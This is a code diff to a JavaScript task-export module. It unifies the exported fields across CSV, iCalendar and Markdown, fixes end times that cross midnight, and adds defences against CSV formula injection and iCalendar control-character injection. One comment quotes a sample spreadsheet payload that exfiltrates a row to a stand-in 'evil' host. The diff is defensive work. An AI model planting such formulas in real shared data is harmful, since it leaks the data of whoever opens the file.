@@ -56,6 +56,39 @@
 
   function str(v) { return v == null ? "" : String(v); }
 
+  // Columns each format already spells STRUCTURALLY, so repeating them as
+  // "Label: value" filler would be noise. DECLARED here rather than passed at the
+  // call site, so "is this format allowed to omit that column" has one answer a
+  // test can read: every column not listed for a format MUST appear in it.
+  const STRUCTURAL_KEYS = ["date", "start", "end", "duration", "title", "notes"];
+  const STRUCTURAL_BY_FORMAT = {
+    csv: [],                                  // a flat row spells every column
+    ics: STRUCTURAL_KEYS,                     // DTSTART/DTEND/SUMMARY/DESCRIPTION
+    // Markdown adds `status`: the checkbox IS the status, so "Status: open"
+    // under a "- [ ]" bullet is the same fact twice.
+    md: STRUCTURAL_KEYS.concat(["status"])
+  };
+  const COLUMN_BY_KEY = TASK_COLUMNS.reduce((acc, c) => { acc[c.key] = c; return acc; }, {});
+
+  function field(task, m, key) {
+    const column = COLUMN_BY_KEY[key];
+    return column ? str(column.get(task, m)) : "";
+  }
+
+  // Every non-structural column, as "Label: value" lines. This is what makes the
+  // one-field-list promise at the top of this file TRUE rather than aspirational:
+  // before it existed only toCsv read TASK_COLUMNS, so ICS silently dropped
+  // priority/points/tags/addedByGuest and Markdown dropped those plus
+  // type/calendar. A column added to the list now reaches all three formats.
+  function extraLines(task, m, format) {
+    const skip = STRUCTURAL_BY_FORMAT[format] || STRUCTURAL_KEYS;
+    return TASK_COLUMNS
+      .filter(c => skip.indexOf(c.key) === -1)
+      .map(c => [c.label, str(c.get(task, m))])
+      .filter(pair => pair[1])
+      .map(pair => pair[0] + ": " + pair[1]);
+  }
+
   function normalizeMeta(meta) {
     const m = meta || {};
     return {
@@ -80,7 +113,15 @@
   // Quote when the value holds a comma, quote, CR or LF; double interior quotes.
   // CRLF row terminator, which is what the RFC says and what Excel wants.
   function csvCell(value) {
-    const s = str(value);
+    let s = str(value);
+    // FORMULA INJECTION. Excel and Sheets execute a cell that opens with = + - @
+    // (or a leading tab/CR), so `=HYPERLINK("https://evil/?"&A1,"click")` in a
+    // task title exfiltrates the row the moment the owner opens the file. That is
+    // reachable by anyone holding the share link: the guest task POST stores
+    // `title` and `note` with no character filtering at all, and those land in
+    // the Title and Notes columns. A leading apostrophe forces the cell to text.
+    // Quoting alone does NOT help — Excel strips the quotes and evaluates.
+    if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
     if (!/[",\r\n]/.test(s)) return s;
     return '"' + s.replace(/"/g, '""') + '"';
   }
@@ -107,7 +148,13 @@
       .replace(/\\/g, "\\\\")
       .replace(/;/g, "\\;")
       .replace(/,/g, "\\,")
-      .replace(/\r?\n/g, "\\n");
+      // A LONE \r used to survive `\r?\n`. RFC 5545 forbids control characters in
+      // TEXT values, and a lenient parser that splits on bare CR would read the
+      // rest of a SUMMARY as a new content line, letting guest-supplied task text
+      // choose its own iCalendar properties. Guest titles are only trimmed
+      // upstream, so nothing else filters an interior control character.
+      .replace(/\r\n|\r|\n/g, "\\n")
+      .replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, "");
   }
 
   // UTF-8 size of one code point, computed rather than measured: this file is
@@ -173,15 +220,38 @@
 
   // A task with a start and no end still deserves a real DTEND: an importer given
   // a zero-length event renders a sliver nobody can click.
-  function endTimeFor(task) {
+  //
+  // Returns { date, time } rather than a bare time, so DTEND can legally land on
+  // the NEXT day. The first cut clamped to 23:59 instead, which broke three
+  // end-of-day cases, all silently (the file imports, it is just not the day the
+  // owner had):
+  //   - `end: "24:00"` passed straight through as hour 24, which RFC 5545 does
+  //     not allow (hour is 00-23). Reachable today: route-helpers.js clamps a
+  //     derived end with `Math.min(24 * 60, ...)`, so a 23:30 quick-task with a
+  //     60m duration stores literally "24:00".
+  //   - A task crossing midnight (23:00 -> 00:30) failed the `explicit > start`
+  //     STRING compare, fell through to duration, and clamped: 31 minutes lost.
+  //   - 23:59 + 30m clamped to 23:59, producing DTEND === DTSTART: exactly the
+  //     zero-length event this function exists to prevent.
+  function endTimeFor(task, date) {
     const start = timeCompact(task.start);
     if (!start) return null;
-    const explicit = timeCompact(task.end);
-    if (explicit && explicit > start) return explicit;
-    const minutes = Number(task.durationMinutes) || 30;
     const startMinutes = Number(start.slice(0, 2)) * 60 + Number(start.slice(2, 4));
-    const total = Math.min(startMinutes + minutes, 23 * 60 + 59);
-    return pad2(Math.floor(total / 60)) + pad2(total % 60) + "00";
+    const explicit = timeCompact(task.end);
+    let endMinutes;
+    if (explicit) {
+      endMinutes = Number(explicit.slice(0, 2)) * 60 + Number(explicit.slice(2, 4));
+      // "24:00" and a genuine midnight crossing both mean "tomorrow".
+      if (endMinutes <= startMinutes) endMinutes += 24 * 60;
+    } else {
+      endMinutes = startMinutes + (Number(task.durationMinutes) || 30);
+    }
+    const rollsOver = endMinutes >= 24 * 60;
+    const mins = endMinutes % (24 * 60);
+    return {
+      date: rollsOver ? nextDayCompact(date) : dateCompact(date),
+      time: pad2(Math.floor(mins / 60)) + pad2(mins % 60) + "00"
+    };
   }
 
   function icsUid(task, m, index) {
@@ -211,17 +281,20 @@
       lines.push("UID:" + icsUid(task, m, index));
       lines.push("DTSTAMP:" + stamp);
       if (start) {
+        const end = endTimeFor(task, date);
         lines.push("DTSTART:" + dateCompact(date) + "T" + start);
-        lines.push("DTEND:" + dateCompact(date) + "T" + endTimeFor(task));
+        lines.push("DTEND:" + end.date + "T" + end.time);
       } else {
         lines.push("DTSTART;VALUE=DATE:" + dateCompact(date));
         lines.push("DTEND;VALUE=DATE:" + nextDayCompact(date));
       }
-      lines.push("SUMMARY:" + icsEscape(task.title));
+      lines.push("SUMMARY:" + icsEscape(field(task, m, "title")));
       const description = [];
-      if (task.detail) description.push(task.detail);
-      if (task.itemTypeLabel) description.push("Type: " + task.itemTypeLabel);
-      if (task.status) description.push("Status: " + task.status);
+      const notes = field(task, m, "notes");
+      if (notes) description.push(notes);
+      // Every remaining column, from the one list, so nothing is dropped here
+      // that the CSV carries.
+      description.push(...extraLines(task, m, "ics"));
       if (m.url) description.push(m.url);
       if (description.length) lines.push("DESCRIPTION:" + icsEscape(description.join("\n")));
       if (task.calendar && task.calendar.name) lines.push("CATEGORIES:" + icsEscape(task.calendar.name));
@@ -272,18 +345,40 @@
 
     const open = list.filter(t => t.status !== "done");
     const done = list.filter(t => t.status === "done");
+    // A RANGE export carried no date at all: toMarkdown never read task.date, so
+    // 31 days collapsed into one undifferentiated list under a range subtitle,
+    // with no way to tell which day anything belonged to. CSV and ICS both got
+    // this right, which is exactly the cross-format drift the one-field-list is
+    // supposed to prevent. Group by day when the export spans more than one.
+    const multiDay = !!(m.from && m.to && m.from !== m.to);
+
+    const bullet = (task, checked) => {
+      const time = mdTimeLabel(task);
+      out.push("- [" + (checked ? "x" : " ") + "] "
+        + (time ? "**" + time + "** " : "")
+        + mdOneLine(field(task, m, "title"))
+        + (task.durationMinutes && time !== task.durationMinutes + "m" ? " (" + task.durationMinutes + "m)" : ""));
+      for (const line of mdNoteLines(field(task, m, "notes"))) out.push("  - " + line);
+      for (const line of extraLines(task, m, "md")) out.push("  - " + line);
+    };
 
     const section = (heading, rows, checked) => {
       if (!rows.length) return;
-      out.push("", "## " + heading);
-      out.push("");
+      out.push("", "## " + heading, "");
+      if (!multiDay) {
+        for (const task of rows) bullet(task, checked);
+        return;
+      }
+      const byDate = new Map();
       for (const task of rows) {
-        const time = mdTimeLabel(task);
-        out.push("- [" + (checked ? "x" : " ") + "] "
-          + (time ? "**" + time + "** " : "")
-          + mdOneLine(task.title)
-          + (task.durationMinutes && time !== task.durationMinutes + "m" ? " (" + task.durationMinutes + "m)" : ""));
-        for (const line of mdNoteLines(task.detail)) out.push("  - " + line);
+        const key = str(task.date || m.date || m.from);
+        if (!byDate.has(key)) byDate.set(key, []);
+        byDate.get(key).push(task);
+      }
+      for (const key of [...byDate.keys()].sort()) {
+        out.push("### " + key, "");
+        for (const task of byDate.get(key)) bullet(task, checked);
+        out.push("");
       }
     };
 
@@ -330,6 +425,7 @@
   return {
     FORMATS: FORMATS,
     TASK_COLUMNS: TASK_COLUMNS,
+    STRUCTURAL_BY_FORMAT: STRUCTURAL_BY_FORMAT,
     toCsv: toCsv,
     toIcs: toIcs,
     toMarkdown: toMarkdown,
